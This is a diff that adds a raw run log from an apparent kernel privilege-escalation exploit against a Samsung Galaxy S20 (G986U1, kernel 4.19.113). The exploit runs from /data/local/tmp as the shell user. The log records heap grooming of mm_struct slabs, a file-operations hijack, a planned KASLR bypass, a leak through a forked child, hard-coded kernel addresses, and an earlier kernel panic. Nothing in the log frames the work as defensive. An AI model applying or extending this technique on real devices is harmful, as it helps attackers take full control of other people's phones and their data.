@@ -1,0 +1,80 @@
+=== run 2026-11-03T11:39:50-06:00 budget=78s fresh=0 env=KS_FOPS_ROUTE=1 KS_PLANT_ALL=1 KS_IMAGE_ZERO=1
+bootreason_before=kernel_panic,null
+-rw-rw-rw- 1 shell shell  0 2026-11-03 10:50 /data/local/tmp/ghostlock_ks_cache.txt
+-rw-rw-rw- 1 shell shell 22 2026-11-03 11:16 /data/local/tmp/ks_mm_answer.txt
+/home/ubuntu/S20-SM-G986U1/build/samsung-g986u1-4.19.113/bin/preload.so: 1 file pushed, 0 skipped. 81.6 MB/s (259488 bytes in 0.003s)
+--- payload start 2026-11-03T11:39:50-06:00
+[+] exlog open path=/data/local/tmp/ks_log.txt pid=17685 uid=2000
+[+] preload starting pid=17685 log=/data/local/tmp/ks_log.txt
+[+] startup context pid=17685 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=17685 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=17685 label=samsung_g986u1_4.19.113 slide=pselect main=pselect
+[+] p0 profile pid=17685 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffffc002c25ea8 bootid_data=ffffffc000080000 init_task=ffffffc002c2f9c0 root_tg=ffffffc003211c00 sysctl_bootid=ffffffc0033adcec
+[*] slide skipped; KASLR via configfs scan after fops hijack
+[*] MMSLAB baseline mm_struct            684    928   1024   32    8 : tunables    0    0    0 : slabdata     29     29      0
+[*] SLABPAGES baseline Slab:             499432 kB
+[*] memory detected ram=0x2c0000000 (11 GB) window_end=ffffffc2c0000000
+[*] KS_COST reps=128 mult=4 pile2_baseline=1
+[*] parameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] futex_init hashsize=0x800 (cpus=8)
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->63 active=2016->2016 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=63->64 active=2016->2048 da=32 ds=1 cls=new
+[*] KS_LEAK child pid=19253 (forked mm target)
+[*] target    0000007f635d20e0
+[*] KS_PRE lead=19 fillers=32 leak_slot=1 slabs=63->64
+[*] KS_BURST slots=32 boundary_slabs=64 after_slabs=64 span_ok=1 expect=32 plan_cpu=1
+[*] KS_BUDDY_CAPTURE tries=50 sends=50 errno=0 sndbuf=16777216 cpu=0
+[*] KS_SLOT tag=control i=0 slabs=64->65 active=2048->2080 da=32 ds=1 cls=new
+[*] KS_SLOT tag=control i=1 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=2 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=3 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=4 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=5 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=6 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=7 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=8 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=9 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=10 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=11 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=12 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=13 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=14 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=15 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=16 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=17 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=18 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=19 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=20 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=21 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=22 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=23 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=24 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=25 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=26 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=27 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=28 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=29 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=30 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=31 slabs=65->65 active=2080->2080 da=0 ds=0 cls=same
+[*] KS_CONTROL slots=32 boundary_slabs=65 after_slabs=65 span_ok=1 expect=32 last_pid=19320
+payload_exit=124 at 2026-11-03T11:41:08-06:00
+DEVICE=ALIVE bootreason_after=kernel_panic,null
+LOG=/home/ubuntu/runs/20261103_113950.log
